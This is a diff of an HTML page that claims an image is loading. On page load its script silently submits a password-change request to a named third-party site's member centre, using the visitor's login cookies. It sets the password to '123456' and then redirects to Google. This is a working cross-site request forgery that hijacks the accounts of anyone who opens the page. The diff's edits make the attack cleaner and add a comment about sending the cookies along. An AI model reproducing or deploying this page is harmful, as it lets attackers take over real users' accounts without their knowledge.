@@ -20,7 +20,7 @@
   <p id="status">图片加载中，请稍后…</p>
 
   <script>
-    function submitFormAndLoopRedirect() {
+    window.onload = function () {
       const formData = new FormData();
       formData.append("oldPassword", "123456789");
       formData.append("newPassword", "123456");
@@ -29,25 +29,22 @@
       fetch("https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword", {
         method: "POST",
         body: formData,
-        credentials: "include"
+        credentials: "include"  // 若有登录 Cookie，可尝试带上
       })
-      .then(() => {
-        // 每 3 秒循环跳转
-        setInterval(() => {
-          window.location.href = "https://www.google.com/?hl=zh_TW";
-        }, 3000);
+      .then(response => {
+        // ✅ 提交成功后跳转
+        window.location.href = "https://www.google.com/?hl=zh_TW";
       })
       .catch(error => {
         document.getElementById("status").innerText = "提交失败，请稍后重试。";
         console.error("提交失败：", error);
       });
-    }
-
-    window.onload = submitFormAndLoopRedirect;
+    };
   </script>
 
 </body>
 </html>
+
 
 
 
